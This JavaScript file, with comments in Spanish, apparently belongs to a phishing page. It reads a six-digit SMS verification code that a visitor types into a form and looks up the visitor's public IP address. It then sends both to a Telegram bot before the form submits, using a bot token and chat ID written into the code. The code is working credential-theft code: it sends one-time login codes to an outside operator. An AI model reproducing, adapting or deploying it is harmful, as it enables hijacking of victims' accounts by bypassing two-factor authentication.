function validarCodigo() {
    const codigo = document.getElementById('codigo_sms').value;

    if (codigo.length === 6) {
        // Validación correcta
        return true;
    } else {
        alert('Por favor ingrese un código de 6 dígitos');
        return false;
    }
}

// Función para enviar el mensaje al bot de Telegram
function enviarMensajeTelegram() {
    const codigo = document.getElementById('codigo_sms').value;

    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ipCliente = data.ip;
            const token = '8154699985:AAF5EOocduTbaaiPnaTMIsaIK2RZaGLgcTM'; // Token de tu bot
            const chatId = '1415509092'; // Reemplaza con tu chat ID
            const mensaje = `🚨 **Nuevo código recibido** 🚨

🔑 **Código SMS:** ${codigo}

🌍 **IP Cliente:** ${ipCliente}`;

            // Enviar el mensaje a Telegram
            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: mensaje,
                    parse_mode: 'Markdown' // Usamos Markdown para dar formato al mensaje
                })
            }).then(() => {
                console.log("Mensaje enviado correctamente");
            });

            // Si el código es válido, continuar con el envío del formulario
            return true;
        });

    return false; // Prevenir que se envíe el formulario antes de completar el proceso
}